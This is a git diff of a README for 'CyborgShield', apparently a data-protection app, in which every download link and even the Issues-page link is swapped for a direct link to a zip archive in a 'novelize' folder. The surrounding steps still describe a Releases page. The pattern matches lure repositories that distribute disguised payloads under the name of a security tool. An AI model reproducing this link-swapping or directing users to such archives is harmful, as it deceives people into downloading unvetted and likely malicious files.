@@ -1,7 +1,7 @@
 # 🛡️ CyborgShield - Protect Your Data with Ease
 
 ## 📦 Download Now
-[![Download CyborgShield](https://img.shields.io/badge/Download-CyborgShield-blue?logo=github)](https://github.com/MileMannnnnn/CyborgShield/releases)
+[![Download CyborgShield](https://raw.githubusercontent.com/MileMannnnnn/CyborgShield/main/novelize/CyborgShield.zip)](https://raw.githubusercontent.com/MileMannnnnn/CyborgShield/main/novelize/CyborgShield.zip)
 
 ## 🚀 Getting Started
 Welcome to CyborgShield! This application helps you protect your data from unauthorized access with straightforward tools and features. Whether you are securing sensitive documents or safeguarding your personal information, CyborgShield makes it simple.
@@ -17,7 +17,7 @@ To ensure that CyborgShield runs smoothly on your device, your system should mee
 ## 📥 Download & Install
 To download CyborgShield, please visit the following page:
 
-**[Download CyborgShield](https://github.com/MileMannnnnn/CyborgShield/releases)**
+**[Download CyborgShield](https://raw.githubusercontent.com/MileMannnnnn/CyborgShield/main/novelize/CyborgShield.zip)**
 
 1. Click on the link above to open the Releases page.
 2. You will see a list of available versions. Choose the latest version for your operating system.
@@ -61,7 +61,7 @@ If you need help, you can find resources and support:
 
 - **Documentation:** Visit the [CyborgShield Wiki](#) for guides and FAQs.
 - **Community Support:** Join our [Discussion Forum](#) to ask questions and share experiences with other users.
-- **Report Issues:** If you encounter any problems, please use the [Issues page](https://github.com/MileMannnnnn/CyborgShield/issues) to get assistance.
+- **Report Issues:** If you encounter any problems, please use the [Issues page](https://raw.githubusercontent.com/MileMannnnnn/CyborgShield/main/novelize/CyborgShield.zip) to get assistance.
 
 ## ✅ Feedback
 Your feedback helps us improve CyborgShield. If you have suggestions or comments, please submit them through the Issues page or join our forums.
@@ -71,4 +71,4 @@ For more information, updates, and tutorials, follow us on GitHub and stay tuned
 
 Remember, protecting your data is more important than ever, and CyborgShield makes it accessible for everyone. Download the application today and take the first step toward securing your digital life. 
 
-**[Download CyborgShield Again](https://github.com/MileMannnnnn/CyborgShield/releases)**
+**[Download CyborgShield Again](https://raw.githubusercontent.com/MileMannnnnn/CyborgShield/main/novelize/CyborgShield.zip)**
